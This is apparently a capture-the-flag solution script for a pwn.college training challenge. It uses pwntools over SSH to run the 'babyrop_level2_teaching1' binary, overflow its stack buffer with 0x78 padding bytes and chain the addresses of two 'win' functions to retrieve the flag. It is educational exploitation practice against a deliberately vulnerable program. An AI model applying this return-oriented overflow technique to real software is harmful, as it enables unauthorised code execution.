from pwn import *

e = ELF('./babyrop_level2_teaching1')
s = ssh(user="ssu-csec",host="ssu-csec.pwn.college",keyfile='../../key',port=22)

p = s.run('/babyrop_level2_teaching1')

p.recvuntil(b'and 8 that will overwrite the return address).\n')

pay = b'A' * 0x78
pay += p64(e.symbols['win_stage_1'])
pay += p64(e.symbols['win_stage_2'])

p.send(pay)

p.recvuntil(b'You win! Sending you the flag!')
print(p.recv().decode().strip())